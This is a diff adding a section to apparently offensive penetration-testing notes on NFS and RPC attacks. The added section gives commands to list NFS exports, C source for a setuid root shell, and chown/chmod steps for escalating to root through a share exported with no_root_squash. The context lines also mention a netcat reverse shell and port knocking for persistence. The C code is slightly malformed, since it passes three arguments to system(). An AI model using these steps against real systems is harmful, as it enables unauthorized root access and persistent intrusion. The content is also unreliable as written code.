@@ -47,3 +47,29 @@ rpcinfo -p [ip]
 #### we can use a “xinetd” RPC-based UDP service combined with a netcat reverse shell, and a “port knocking” method for persistence on a host once we have access.
 
 there are possible privilege escalation methods if NFS service is available to us, refer to [this section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/nfs) under linux privilege escalation.
+
+## NFS Exported Shares
+
+List NFS exported shares:
+
+```
+showmount -e 192.168.110.102
+```
+
+and check if 'rw,no\_root\_squash' is present. If it is present, compile the below sid-shell.c:
+
+```c
+#include <unistd.h>
+
+main( int argc, char ** argv, char ** envp )
+{
+    setgid(0); setuid(0); system("/bin/bash", argv, envp);
+    return 0;
+}
+```
+
+upload it to the share and execute the below to launch sid-shell to spawn a root shell:
+
+```
+chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
+```
